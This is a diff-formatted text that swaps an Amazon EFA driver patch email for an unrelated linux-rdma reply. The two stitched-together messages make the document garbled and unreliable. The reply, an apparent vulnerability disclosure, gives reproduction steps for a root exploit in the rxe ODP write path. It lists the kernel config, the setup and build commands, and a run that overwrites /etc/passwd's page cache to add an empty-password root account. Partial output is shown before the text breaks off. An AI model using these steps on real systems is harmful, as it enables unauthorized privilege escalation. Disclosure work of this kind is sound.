@@ -1,403 +1,443 @@
-Received: from pdx-out-003.esa.us-west-2.outbound.mail-perimeter.amazon.com (pdx-out-003.esa.us-west-2.outbound.mail-perimeter.amazon.com [44.246.68.102])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-ej1-f54.google.com (mail-ej1-f54.google.com [209.85.218.54])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 9997B1E1DE5
-	for <linux-rdma@vger.kernel.org>; Sun, 26 Jul 2026 12:39:34 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=44.246.68.102
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785069576; cv=none; b=X/9hHrJjDogtaYZrNGm4P5PxQeOk2ELmmHtE8MWuDrCmi7NiXtK4f9EB3hB0/e+9SIE9mOXIimV/w4pII3uV9jurcRGrsgFU7LnAdExtQcWS5o2NgDy0jJ/JOHLS0mdPzLE0ga+ydjqXrGbmaDpHHbHjygaVao+nX/a1R4VtWQg=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785069576; c=relaxed/simple;
-	bh=ITHNkTwELwavXUKrDk1/nVmhs8O7dGV30NVWtuG3PJU=;
-	h=From:To:CC:Subject:Date:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=uVzdn0etV6cLjTUUruWxFF8xmpSazT4xa8TOuMFPcSpJo9Ce4aJ5uRPmucqYstitOjOOCth+Dfn/fAp0EKxk12UG9VvaAIVyT0pzFfMxmXQNco5GvSBxr8A397eIOoDrPIiFh5XdwSYKekQSagiUaCVkDj24v+U+H07+S/fuF4Y=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.com; spf=pass smtp.mailfrom=amazon.com; dkim=pass (2048-bit key) header.d=amazon.com header.i=@amazon.com header.b=PI0zCypA; arc=none smtp.client-ip=44.246.68.102
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=amazon.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=amazon.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id CDE4825D527
+	for <linux-rdma@vger.kernel.org>; Sun, 26 Jul 2026 13:10:23 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.218.54
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1785071425; cv=pass; b=rZjyIlGfJPNc2UCKOBjcWehviRlTEN4bIdl9by2vYO3jIsTDJIyuRM0igNjAL55GVg1eWaUGPCmyTsMukWNJ7f+Q3RoZlX8fa8U0v/2pqfb8D6Wa9Qfv0axfrvLR+U6Vmn17WPcWtfPnqJwUS/3l/FC+/HL0TWuQk7GDaftKAY0=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1785071425; c=relaxed/simple;
+	bh=e8RlADi5zfDo2/g1jdxbbCFtFpXFi66m8JH3cqzh/QA=;
+	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
+	 To:Cc:Content-Type; b=ssOHrXjBQO6wou3zR3AmL9/0u46tOu++apoLEzi+5tAblTOEbgCwEHENay7+51aMs+jdPi5gg2lJZST7nFX/FVP11C15M6SACVTZnZ9Q6dZMLrRj/8Gv4ZWTxdYLNtTxiBA4wHi7wO+jQPzVFuPEIXsmEnwBEtdh1btTH8p+7D0=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=SYsBimhb; arc=pass smtp.client-ip=209.85.218.54
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=amazon.com header.i=@amazon.com header.b="PI0zCypA"
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="SYsBimhb"
+Received: by mail-ej1-f54.google.com with SMTP id a640c23a62f3a-c197e7e4e94so334718066b.2
+        for <linux-rdma@vger.kernel.org>; Sun, 26 Jul 2026 06:10:23 -0700 (PDT)
+ARC-Seal: i=1; a=rsa-sha256; t=1785071422; cv=none;
+        d=google.com; s=arc-20260327;
+        b=dlv0qydtHjOPT5TSXTIZikp8TEuKAn3G+SldrQtkEfdYkwm9mckvpqv1KaXVJDMCRK
+         nHU9NXPBGHquK40dvzCEirxktcVOD+dmh6hb0+cj5C/CX8Qghd/h/hwWbD6fyVihclSt
+         siNz+IMvbVPhlKH7xadJy+y+BE2/3sC4Ywsb/YxFwr0pVNroDpsNBh9LR8x//m1bOpFJ
+         nuEpd29O+/xTRyagqTsBY6E56dkhp+oPGTBvXhlC0dawZ9N0mWcFZS9cxGauYN5fsDs5
+         w2hLY/usf4rkZnQ8fZyReFuE2fKLe3iiobjD/+NVT+78kOAZqL2iR7rgNqOKdugGq1J9
+         Q7ow==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
+        h=cc:to:subject:message-id:date:from:in-reply-to:references
+         :mime-version:dkim-signature;
+        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
+        fh=8V+uV91gSm3KLGeWyYZSn1szwMs87Kx04DrFgs8J5W8=;
+        b=EcraYZ7z7dzkdSr1S1Iw4mM5UshlXmEakzHTVKmgTRIlUgd+18WbJknARyoGAvFXTi
+         peKs2EbJCJwQVNXW+pvxm1+p87WViR7f4jv37LxewrHubbpTGPl2Qxpg6PZR18tgqUdK
+         9q/vq2ELaWDfzYC/9xzpzcfzaEacqPUydpwi4won94ZK/9vMoqSSnAFU0v/XFbgC3kr2
+         vnuE1PBGjekXLROg4Tm/uxxPQ3Odiu00v5JEQBQkGKbKpR5PNQD3rRvbxw4g0GeMi6vv
+         SdhtuFvZGEJ6WThuBMX4uixRUUyvg0SY0dh5Aqy9zJIVL90RFyTPMK56JcC6bvUqD5s8
+         7hQQ==;
+        darn=vger.kernel.org
+ARC-Authentication-Results: i=1; mx.google.com; arc=none
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-  d=amazon.com; i=@amazon.com; q=dns/txt; s=amazoncorp2;
-  t=1785069574; x=1816605574;
-  h=from:to:cc:subject:date:message-id:in-reply-to:
-   references:mime-version:content-transfer-encoding;
-  bh=sdX5Mup2xBNnKdRVj/ERjKiKw8gt/jdFvTJtq9aVEYs=;
-  b=PI0zCypA5fbhOHC2BNK9h8ojTlKeq+r52GqCAAtheWXNPArEESFTyEyW
-   qq2dEkwhuhCMxvFxWPc0udBLxnICzbgBkJVcUR4rSBwP+QtUtlVM8jSAG
-   r+ghn0+glbv5c1mmypYi0U+Yj3r2YzCfFBOes/E8Z2QJfa2tKsEGXXzbh
-   /9ARpMLCXlaq90jVeAiLCw8LQ49Y/x/Km97VyoPxkqjQ0BZaz/wc9cwO0
-   ZUk12wGqWwunJrcG9RB0IA4OhGWdUYuPvgt68moQzGVF0rvJg4K/dBXBv
-   jLmiYq1abuQOs3QJXnoBCTXixeoH54YCnc1bh5d/KSmmycE4gR2lobERH
-   A==;
-X-CSE-ConnectionGUID: xnepei5KSlqKKv9emt2Slw==
-X-CSE-MsgGUID: WXAnIsx1STOwYU1PHv+IIQ==
-X-IronPort-AV: E=Sophos;i="6.25,186,1779148800"; 
-   d="scan'208";a="24391155"
-Received: from ip-10-5-12-219.us-west-2.compute.internal (HELO smtpout.naws.us-west-2.prod.farcaster.email.amazon.dev) ([10.5.12.219])
-  by internal-pdx-out-003.esa.us-west-2.outbound.mail-perimeter.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 26 Jul 2026 12:39:31 +0000
-Received: from EX19MTAUWB002.ant.amazon.com [205.251.233.48:13125]
- by smtpin.naws.us-west-2.prod.farcaster.email.amazon.dev [10.0.38.8:2525] with esmtp (Farcaster)
- id fd459687-0684-41e1-bd3b-5658258da429; Sun, 26 Jul 2026 12:39:31 +0000 (UTC)
-X-Farcaster-Flow-ID: fd459687-0684-41e1-bd3b-5658258da429
-Received: from EX19D001UWA001.ant.amazon.com (10.13.138.214) by
- EX19MTAUWB002.ant.amazon.com (10.250.64.231) with Microsoft SMTP Server
- (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.2562.43;
- Sun, 26 Jul 2026 12:39:30 +0000
-Received: from dev-dsk-ynachum-1b-0ecf7b87.eu-west-1.amazon.com
- (10.13.226.176) by EX19D001UWA001.ant.amazon.com (10.13.138.214) with
- Microsoft SMTP Server (version=TLS1_2,
- cipher=TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA) id 15.2.2562.45; Sun, 26 Jul 2026
- 12:39:29 +0000
-From: Yonatan Nachum <ynachum@amazon.com>
-To: <jgg@nvidia.com>, <leon@kernel.org>, <linux-rdma@vger.kernel.org>
-CC: <mrgolin@amazon.com>, <sleybo@amazon.com>, <matua@amazon.com>,
-	<gal.pressman@linux.dev>, Yonatan Nachum <ynachum@amazon.com>, Tom Sela
-	<tomsela@amazon.com>
-Subject: [PATCH for-next 3/3] RDMA/efa: Add support for 128B admin v2 SQ entry
-Date: Sun, 26 Jul 2026 12:38:54 +0000
-Message-ID: <20260726123854.638687-4-ynachum@amazon.com>
-X-Mailer: git-send-email 2.50.1
-In-Reply-To: <20260726123854.638687-1-ynachum@amazon.com>
-References: <20260726123854.638687-1-ynachum@amazon.com>
+        d=gmail.com; s=20251104; t=1785071422; x=1785676222; darn=vger.kernel.org;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
+        b=SYsBimhbEXPOWmwzpGey8FEj825Fu8YF1FP813jFiEPGiUh0hEm0rGG11w/lcz7c4k
+         Vie5zJy747FYsDP/VJ8OnCDDamCrYq5Abu3d4d6qtN/TGJoP996QqEHPNEMrRnD1KeLd
+         hkwgQCYFLAUE+FyOpnrMiYUz7s0qj+BF23p9dfbGa+jDQ5pFdmEGJz7ahkBfGDBkj0jX
+         /hohfqQ9tbYu1m8iDFDRrY5t0+Dv3SjP4w2T7SpVBfqFkbmaAj7ESwyurlVMwBJcVBPd
+         D3XDT15NCq6rnUWRYzsbFnK63YDIBtBVihcOuY2byT8iVMoIonGo9tvu3rIi/Uj57TOc
+         Vg8Q==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1785071422; x=1785676222;
+        h=content-type:cc:to:subject:message-id:date:from:in-reply-to
+         :references:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
+         :subject:date:message-id:reply-to:content-type;
+        bh=+NrWYl3pQgERZ4te8bar8G94oeCnqqmmaJEyqJ0e/c4=;
+        b=b7h7cxCkzV/K97dkocpH9GmLrhE6kZ7PuqDkr3ydvEhzyXSwwn4r1SsvmOdYwmjunq
+         P6+Ze+S6UZLwfh+OFZ/EAP5wFIxUNpnfh5VJ6HpFNNS1MapE6pKlaphfP0nGwYPSI5bW
+         4P7dVxxbd8H8N2T6siChXXnnVn3M1Loc5GZnNenbMGuxmk/Zk9y1UgNglMLW9nAFiz3E
+         lVQSfzx5aw5I/OoreluBJf9vhpGr7d6jUCFbcifaHZS6bHFK5vboleA/8vqBiptmbRO7
+         Qvhe1Cjn8AROgUfs1lhLZiH99SD5ZKOVKUMvyk1N+Cp61yPWjxtqVderC0YhdTA5Vz7Y
+         mhKA==
+X-Gm-Message-State: AOJu0YxVzu3GQbC/y9zPx4ipEayTnLu7jtoByWVG0HYXOlhoXrxa6PBK
+	J4pgs9z2jT/WphjntSrrDzA1iH+B/rA+3hDdVmDZkuObvqeLC1kFgyWzQw+yyI3l8D68ndUf2iC
+	JaRw5tjDltIM8GbZoLzRlC1fE9zZbjKKbNQ8pEhbA/w==
+X-Gm-Gg: AR+sD10/FPoVKDICBhFIiezbV0HKhy+nSgHwVeN34G1MwkVIYn2tOhTIH7RejcpaKHi
+	2Pr1pzB9hTe2puIpvpHOvNRfbonZAbhvSUOeIaxref7CDbbBHNVg2oxPYgCTjnU09+dklQ+mvse
+	XQwb14nHaMEvpnC+kiwsqLcG6pmTYHiGZYURUxSvz2IBcB0p9nsSGFmEVgGwuR+0AgmyheDCpo6
+	6gSlpHc6uuV3OHoe02roXuX3gjTtnzGhe1WC/3TVWA9WQBtVBrysPYoX2HcoeMbcXIel2ly6Csn
+	y8PnypMIKd8mK8q0FEM=
+X-Received: by 2002:a17:906:8d8b:b0:c16:318:34e3 with SMTP id
+ a640c23a62f3a-c1f1ecec83fmr200316466b.16.1785071421608; Sun, 26 Jul 2026
+ 06:10:21 -0700 (PDT)
 Precedence: bulk
 X-Mailing-List: linux-rdma@vger.kernel.org
 List-Id: <linux-rdma.vger.kernel.org>
 List-Subscribe: <mailto:linux-rdma+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-rdma+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
-Content-Type: text/plain
-X-ClientProxiedBy: EX19D042UWB002.ant.amazon.com (10.13.139.175) To
- EX19D001UWA001.ant.amazon.com (10.13.138.214)
+References: <20260726111533.1037819-1-bestswngs@gmail.com>
+In-Reply-To: <20260726111533.1037819-1-bestswngs@gmail.com>
+From: Weiming Shi <bestswngs@gmail.com>
+Date: Sun, 26 Jul 2026 21:09:43 +0800
+X-Gm-Features: AUfX_myGPD2tvruCJ4RtaMf4dbyUqyzgOyHtVhy51_AAvoAb0s8Qc77OUNG0uJk
+Message-ID: <CANgPUi23n7XQJdtfitQLZ_1AwQPrL-xBR5Q6OHoF9sCARPuwrw@mail.gmail.com>
+Subject: Re: [PATCH] RDMA/rxe: Restore HMM_PFN_WRITE check in ODP write paths
+To: linux-rdma@vger.kernel.org
+Cc: Jason Gunthorpe <jgg@nvidia.com>, Zhu Yanjun <yanjun.zhu@linux.dev>, 
+	Leon Romanovsky <leon@kernel.org>, Hongqiang Luo <wanbafv@gmail.com>, Xinyu Ma <mmmxny@gmail.com>, 
+	Shaomin Chen <eeesssooo020@gmail.com>, Rui Ding <threonine42@gmail.com>, 
+	Miao Zhao <muel@nova.gal>
+Content-Type: text/plain; charset="UTF-8"
 
-Add the new admin v2 format which is 128B in size and its header extends
-the v1 header with checksum and payload version.
-On admin SQ init check if the API version reported by the device
-supports the admin v2 SQ entry and if so use it. Store the payload
-offset and max size in the SQ for quick access in admin command
-execution flow.
+Reproduction Steps:
 
-Using the admin SQ v2 entry implicitly enable the checksum in its
-header so set it for device to validate against.
+1. Requirements
 
-Reviewed-by: Michael Margolin <mrgolin@amazon.com>
-Reviewed-by: Tom Sela <tomsela@amazon.com>
-Signed-off-by: Yonatan Nachum <ynachum@amazon.com>
----
- drivers/infiniband/hw/efa/efa_admin_defs.h |  29 +++++-
- drivers/infiniband/hw/efa/efa_com.c        | 113 +++++++++++++++------
- drivers/infiniband/hw/efa/efa_com.h        |   6 ++
- 3 files changed, 116 insertions(+), 32 deletions(-)
+```
+CONFIG_RDMA_RXE=y
+CONFIG_INFINIBAND_ON_DEMAND_PAGING=y   # default when INFINIBAND_USER_MEM=y
+```
 
-diff --git a/drivers/infiniband/hw/efa/efa_admin_defs.h b/drivers/infiniband/hw/efa/efa_admin_defs.h
-index 0a14b3abe6f9..bf1721e31a70 100644
---- a/drivers/infiniband/hw/efa/efa_admin_defs.h
-+++ b/drivers/infiniband/hw/efa/efa_admin_defs.h
-@@ -7,7 +7,7 @@
- #define _EFA_ADMIN_H_
- 
- #define EFA_ADMIN_API_VERSION_MAJOR          0
--#define EFA_ADMIN_API_VERSION_MINOR          2
-+#define EFA_ADMIN_API_VERSION_MINOR          3
- 
- enum efa_admin_aq_completion_status {
- 	EFA_ADMIN_SUCCESS                           = 0,
-@@ -41,6 +41,21 @@ struct efa_admin_aq_common_desc {
- 	u8 flags;
- };
- 
-+struct efa_admin_aq_common_desc_v2 {
-+	struct efa_admin_aq_common_desc common;
-+
-+	/*
-+	 * Poly 0x8005 CRC16 with initial value 0xFFFF and final XOR of
-+	 * 0xFFFF. The checksum covers the entire admin command entry
-+	 * including the zeroed checksum field.
-+	 */
-+	u16 checksum;
-+
-+	u8 payload_ver;
-+
-+	u8 reserved[5];
-+};
-+
- /*
-  * used in efa_admin_aq_entry. Can point directly to control data, or to a
-  * page list chunk. Used also at the end of indirect mode page list chunks,
-@@ -58,6 +73,12 @@ struct efa_admin_aq_entry {
- 	u32 request_payload[15];
- };
- 
-+struct efa_admin_aq_entry_v2 {
-+	struct efa_admin_aq_common_desc_v2 aq_common_descriptor;
-+
-+	u32 request_payload[29];
-+};
-+
- struct efa_admin_acq_common_desc {
- 	/*
- 	 * command identifier to associate it with the aq descriptor
-@@ -74,7 +95,11 @@ struct efa_admin_acq_common_desc {
- 	 */
- 	u8 flags;
- 
--	/* Poly 0x8005 CRC16 with initial value 0xFFFF and final XOR of 0xFFFF */
-+	/*
-+	 * Poly 0x8005 CRC16 with initial value 0xFFFF and final XOR of 0xFFFF.
-+	 * The checksum covers the entire admin completion entry including the
-+	 * zeroed checksum field.
-+	 */
- 	u16 checksum;
- 
- 	u16 reserved;
-diff --git a/drivers/infiniband/hw/efa/efa_com.c b/drivers/infiniband/hw/efa/efa_com.c
-index 72b87f8cd086..74ad1d640fa6 100644
---- a/drivers/infiniband/hw/efa/efa_com.c
-+++ b/drivers/infiniband/hw/efa/efa_com.c
-@@ -25,11 +25,16 @@
- 
- #define EFA_CRC16_INIT_VAL 0xffff
- 
--#define EFA_CRC_MIN_ADMIN_API_VERSION_MAJOR 0
--#define EFA_CRC_MIN_ADMIN_API_VERSION_MINOR 2
-+#define EFA_ADMIN_SQ_MAX_ENT_SIZE sizeof(struct efa_admin_aq_entry_v2)
- 
--#define EFA_MIN_ADMIN_API_VERSION_MAJOR 0
--#define EFA_MIN_ADMIN_API_VERSION_MINOR 1
-+#define EFA_CRC_MIN_API_VERSION_MAJOR 0
-+#define EFA_CRC_MIN_API_VERSION_MINOR 2
-+
-+#define EFA_ADMIN_V2_MIN_API_VERSION_MAJOR 0
-+#define EFA_ADMIN_V2_MIN_API_VERSION_MINOR 3
-+
-+#define EFA_MIN_API_VERSION_MAJOR 0
-+#define EFA_MIN_API_VERSION_MINOR 1
- 
- enum efa_cmd_status {
- 	EFA_CMD_UNUSED,
-@@ -82,6 +87,16 @@ void efa_com_set_dma_addr(dma_addr_t addr, u32 *addr_high, u32 *addr_low)
- 	*addr_high = upper_32_bits(addr);
- }
- 
-+static u32 efa_com_construct_ver(u32 major, u32 minor)
-+{
-+	u32 ver = 0;
-+
-+	EFA_SET(&ver, EFA_REGS_VERSION_MAJOR_VERSION, major);
-+	EFA_SET(&ver, EFA_REGS_VERSION_MINOR_VERSION, minor);
-+
-+	return ver;
-+}
-+
- static u32 efa_com_reg_read32(struct efa_com_dev *edev, u16 offset)
- {
- 	struct efa_com_mmio_read *mmio_read = &edev->mmio_read;
-@@ -138,10 +153,23 @@ static int efa_com_admin_init_sq(struct efa_com_dev *edev)
- {
- 	struct efa_com_admin_queue *aq = &edev->aq;
- 	struct efa_com_admin_sq *sq = &aq->sq;
-+	u32 aq_caps = 0, admin_v2_min_ver = 0;
- 	u32 addr_high, addr_low;
--	u32 aq_caps = 0;
- 
--	sq->entry_size = sizeof(struct efa_admin_aq_entry);
-+	admin_v2_min_ver = efa_com_construct_ver(EFA_ADMIN_V2_MIN_API_VERSION_MAJOR,
-+						 EFA_ADMIN_V2_MIN_API_VERSION_MINOR);
-+	if (edev->dev_api_ver >= admin_v2_min_ver) {
-+		sq->entry_size = sizeof(struct efa_admin_aq_entry_v2);
-+		sq->payload_offset = offsetof(struct efa_admin_aq_entry_v2, request_payload);
-+		sq->proto_ver = EFA_ADMIN_V2_PROTO_VER;
-+	} else {
-+		sq->entry_size = sizeof(struct efa_admin_aq_entry);
-+		sq->payload_offset = offsetof(struct efa_admin_aq_entry, request_payload);
-+		sq->proto_ver = EFA_ADMIN_V1_PROTO_VER;
-+	}
-+
-+	sq->max_payload_size = sq->entry_size - sq->payload_offset;
-+
- 	sq->buffer = dma_alloc_coherent(aq->dmadev, aq->depth * sq->entry_size,
- 					&sq->dma_addr, GFP_KERNEL);
- 	if (!sq->buffer)
-@@ -184,8 +212,8 @@ static int efa_com_admin_init_cq(struct efa_com_dev *edev)
- 
- 	spin_lock_init(&cq->lock);
- 
--	EFA_SET(&crc_min_ver, EFA_REGS_VERSION_MAJOR_VERSION, EFA_CRC_MIN_ADMIN_API_VERSION_MAJOR);
--	EFA_SET(&crc_min_ver, EFA_REGS_VERSION_MINOR_VERSION, EFA_CRC_MIN_ADMIN_API_VERSION_MINOR);
-+	crc_min_ver = efa_com_construct_ver(EFA_CRC_MIN_API_VERSION_MAJOR,
-+					    EFA_CRC_MIN_API_VERSION_MINOR);
- 	if (edev->dev_api_ver >= crc_min_ver)
- 		cq->validate_checksum = true;
- 
-@@ -321,13 +349,45 @@ static inline struct efa_comp_ctx *efa_com_get_comp_ctx_by_cmd_id(struct efa_com
- 	return &aq->comp_ctx[ctx_id];
- }
- 
-+static u16 efa_com_calc_crc16_checksum(u8 *buff, u32 buff_size)
-+{
-+	return crc16(EFA_CRC16_INIT_VAL, buff, buff_size) ^ EFA_CRC16_INIT_VAL;
-+}
-+
-+static void efa_com_construct_aq_entry(struct efa_com_admin_queue *aq, u8 *aq_entry, u16 cmd_id,
-+				       u8 opcode, u8 flags, void *payload, size_t payload_size)
-+{
-+	struct efa_admin_aq_common_desc_v2 *common_v2 = NULL;
-+	struct efa_admin_aq_common_desc *common;
-+	struct efa_com_admin_sq *sq = &aq->sq;
-+
-+	if (sq->proto_ver == EFA_ADMIN_V1_PROTO_VER) {
-+		common = (struct efa_admin_aq_common_desc *)aq_entry;
-+	} else {
-+		common_v2 = (struct efa_admin_aq_common_desc_v2 *)aq_entry;
-+		common = &common_v2->common;
-+	}
-+
-+	common->command_id = cmd_id;
-+	common->opcode = opcode;
-+	common->flags = flags;
-+	EFA_SET(&common->flags, EFA_ADMIN_AQ_COMMON_DESC_PHASE, sq->phase);
-+
-+	if (payload)
-+		memcpy(aq_entry + sq->payload_offset, payload, payload_size);
-+
-+	if (common_v2)
-+		common_v2->checksum = efa_com_calc_crc16_checksum(aq_entry, sq->entry_size);
-+}
-+
- static void __efa_com_submit_admin_cmd(struct efa_com_admin_queue *aq,
- 				       struct efa_comp_ctx *comp_ctx,
--				       struct efa_admin_aq_entry *cmd,
--				       size_t cmd_size_in_bytes,
-+				       u8 opcode, u8 flags,
-+				       void *payload, size_t payload_size,
- 				       struct efa_admin_acq_entry *comp,
- 				       size_t comp_size_in_bytes)
- {
-+	u8 aq_entry[EFA_ADMIN_SQ_MAX_ENT_SIZE] = {};
- 	u16 queue_size_mask, cmd_id, ctx_id, pi;
- 	struct efa_com_admin_sq *sq = &aq->sq;
- 	u8 *aqe;
-@@ -341,21 +401,19 @@ static void __efa_com_submit_admin_cmd(struct efa_com_admin_queue *aq,
- 	cmd_id |= sq->pc << ilog2(aq->depth);
- 	cmd_id &= EFA_ADMIN_AQ_COMMON_DESC_COMMAND_ID_MASK;
- 
--	cmd->aq_common_descriptor.command_id = cmd_id;
--	EFA_SET(&cmd->aq_common_descriptor.flags,
--		EFA_ADMIN_AQ_COMMON_DESC_PHASE, sq->phase);
-+	efa_com_construct_aq_entry(aq, aq_entry, cmd_id, opcode, flags, payload, payload_size);
- 
- 	comp_ctx->status = EFA_CMD_SUBMITTED;
- 	comp_ctx->comp_size = comp_size_in_bytes;
- 	comp_ctx->user_cqe = comp;
--	comp_ctx->cmd_opcode = cmd->aq_common_descriptor.opcode;
-+	comp_ctx->cmd_opcode = opcode;
- 	comp_ctx->cmd_id = cmd_id;
- 
- 	reinit_completion(&comp_ctx->wait_event);
- 
- 	aqe = sq->buffer + sq->entry_size * pi;
- 	memset(aqe, 0, sq->entry_size);
--	memcpy(aqe, cmd, cmd_size_in_bytes);
-+	memcpy(aqe, aq_entry, sq->entry_size);
- 
- 	sq->pc++;
- 	atomic64_inc(&aq->stats.submitted_cmd);
-@@ -399,8 +457,8 @@ static inline int efa_com_init_comp_ctxt(struct efa_com_admin_queue *aq)
- 
- static int efa_com_submit_admin_cmd(struct efa_com_admin_queue *aq,
- 				    struct efa_comp_ctx *comp_ctx,
--				    struct efa_admin_aq_entry *cmd,
--				    size_t cmd_size_in_bytes,
-+				    u8 opcode, u8 flags,
-+				    void *payload, size_t payload_size,
- 				    struct efa_admin_acq_entry *comp,
- 				    size_t comp_size_in_bytes)
- {
-@@ -411,8 +469,8 @@ static int efa_com_submit_admin_cmd(struct efa_com_admin_queue *aq,
- 		return -ENODEV;
- 	}
- 
--	__efa_com_submit_admin_cmd(aq, comp_ctx, cmd, cmd_size_in_bytes, comp,
--				   comp_size_in_bytes);
-+	__efa_com_submit_admin_cmd(aq, comp_ctx, opcode, flags, payload,
-+				   payload_size, comp, comp_size_in_bytes);
- 	spin_unlock(&aq->sq.lock);
- 
- 	return 0;
-@@ -426,7 +484,7 @@ static bool efa_com_cqe_checksum_valid(struct efa_com_admin_queue *aq,
- 
- 	cqe->acq_common_descriptor.checksum = 0;
- 
--	calc_checksum = crc16(EFA_CRC16_INIT_VAL, (u8 *)cqe, sizeof(*cqe)) ^ EFA_CRC16_INIT_VAL;
-+	calc_checksum = efa_com_calc_crc16_checksum((u8 *)cqe, sizeof(*cqe));
- 	if (calc_checksum != cqe_checksum) {
- 		ibdev_err(aq->efa_dev,
- 			  "Received completion with invalid checksum, cqe[%u], calc[%u], sq producer[%d], sq consumer[%d], cq consumer[%d]\n",
-@@ -647,11 +705,10 @@ int efa_com_cmd_exec(struct efa_com_admin_queue *aq,
- 		     void *payload, size_t payload_size,
- 		     struct efa_admin_acq_entry *comp, size_t comp_size)
- {
--	struct efa_admin_aq_entry aq_entry = {};
- 	struct efa_comp_ctx *comp_ctx;
- 	int err;
- 
--	if (payload_size > sizeof(aq_entry.request_payload))
-+	if (payload_size > aq->sq.max_payload_size)
- 		return -EINVAL;
- 
- 	might_sleep();
-@@ -669,12 +726,8 @@ int efa_com_cmd_exec(struct efa_com_admin_queue *aq,
- 		return -EINVAL;
- 	}
- 
--	aq_entry.aq_common_descriptor.opcode = opcode;
--	aq_entry.aq_common_descriptor.flags = flags;
--	if (payload)
--		memcpy(aq_entry.request_payload, payload, payload_size);
--
--	err = efa_com_submit_admin_cmd(aq, comp_ctx, &aq_entry, sizeof(aq_entry), comp, comp_size);
-+	err = efa_com_submit_admin_cmd(aq, comp_ctx, opcode, flags, payload, payload_size, comp,
-+				       comp_size);
- 	if (err) {
- 		ibdev_err_ratelimited(
- 			aq->efa_dev,
-@@ -1003,8 +1056,8 @@ int efa_com_validate_version(struct efa_com_dev *edev)
- 		  EFA_GET(&ver, EFA_REGS_VERSION_MAJOR_VERSION),
- 		  EFA_GET(&ver, EFA_REGS_VERSION_MINOR_VERSION));
- 
--	EFA_SET(&min_ver, EFA_REGS_VERSION_MAJOR_VERSION, EFA_MIN_ADMIN_API_VERSION_MAJOR);
--	EFA_SET(&min_ver, EFA_REGS_VERSION_MINOR_VERSION, EFA_MIN_ADMIN_API_VERSION_MINOR);
-+	min_ver = efa_com_construct_ver(EFA_MIN_API_VERSION_MAJOR,
-+					EFA_MIN_API_VERSION_MINOR);
- 	if (ver < min_ver) {
- 		ibdev_err(edev->efa_dev,
- 			  "EFA version is lower than the minimal version the driver supports\n");
-diff --git a/drivers/infiniband/hw/efa/efa_com.h b/drivers/infiniband/hw/efa/efa_com.h
-index 069c9dd98328..0341704d0921 100644
---- a/drivers/infiniband/hw/efa/efa_com.h
-+++ b/drivers/infiniband/hw/efa/efa_com.h
-@@ -22,6 +22,9 @@
- 
- #define EFA_MAX_HANDLERS 256
- 
-+#define EFA_ADMIN_V1_PROTO_VER 0
-+#define EFA_ADMIN_V2_PROTO_VER 1
-+
- struct efa_com_admin_cq {
- 	struct efa_admin_acq_entry *entries;
- 	dma_addr_t dma_addr;
-@@ -35,8 +38,11 @@ struct efa_com_admin_cq {
- struct efa_com_admin_sq {
- 	u8 *buffer;
- 	u16 entry_size;
-+	u16 payload_offset;
-+	u16 max_payload_size;
- 	dma_addr_t dma_addr;
- 	spinlock_t lock; /* Protects ASQ */
-+	u8 proto_ver;
- 
- 	u32 __iomem *db_addr;
- 
--- 
-2.50.1
+2 . prepare
 
+```bash
+modprobe rdma_rxe
+rdma link add rxe0 type rxe netdev enp2s0  # enp2s0 is your network devices
+```
+
+3. Build  the PoC,then run it we will gain root shell.
+
+```
+gcc -O2 -o poc poc.c -libverbs
+```
+Run the PoC as an unprivileged user; it overwrites /etc/passwd's
+        page cache (target file must be at least 512 bytes, true on any
+        real system) and an empty-password root entry is installed:
+
+```bash
+bash-5.3$ ./poc /etc/passwd lpe
+[*] target=/etc/passwd first 32 bytes before: root:x:0:0:Super User:/root:/bin
+[*] using device rxe0
+[+] ODP MR registered on PROT_READ file mapping: rkey=0x16b5
